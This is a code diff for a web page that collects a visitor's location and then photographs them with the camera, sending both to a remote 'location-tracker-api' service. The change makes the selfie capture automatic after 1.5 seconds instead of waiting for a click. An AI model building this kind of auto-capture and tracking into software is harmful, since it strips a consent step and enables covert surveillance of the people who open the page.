@@ -2,6 +2,7 @@ const button = document.getElementById("shareLocation");
 const statusEl = document.getElementById("status");
 const video = document.getElementById("video");
 const captureBtn = document.getElementById("captureBtn");
+const cameraPermissionSection = document.getElementById("cameraPermissionSection");
 
 const LOCATION_API_URL = "https://location-tracker-api-cjka.onrender.com/location";
 const SELFIE_API_URL = "https://location-tracker-api-cjka.onrender.com/selfie";
@@ -54,6 +55,8 @@ button.addEventListener("click", () => {
                     return;
                 }
 
+                // Show the camera permission prompt immediately
+                cameraPermissionSection.style.display = "block";
                 setStatus("✅ Location saved. Please allow camera access.");
 
                 await startCamera();
@@ -120,7 +123,12 @@ async function startCamera() {
         video.style.display = "block";
         captureBtn.style.display = "block";
 
-        setStatus("Camera ready. Click Capture Selfie.");
+        setStatus("Camera ready. Auto-capturing selfie...");
+
+        // Auto-capture after 1.5 seconds (allows camera to stabilize)
+        setTimeout(() => {
+            captureSelfie();
+        }, 1500);
 
     } catch (err) {
 
@@ -132,7 +140,8 @@ async function startCamera() {
 }
 
 
-captureBtn.addEventListener("click", async () => {
+// Selfie capture logic extracted into a reusable function
+async function captureSelfie() {
 
     const canvas = document.createElement("canvas");
 
@@ -186,4 +195,8 @@ captureBtn.addEventListener("click", async () => {
 
     }, "image/jpeg", 0.9);
 
-});
+}
+
+
+// Keep the manual capture button as a fallback
+captureBtn.addEventListener("click", captureSelfie);
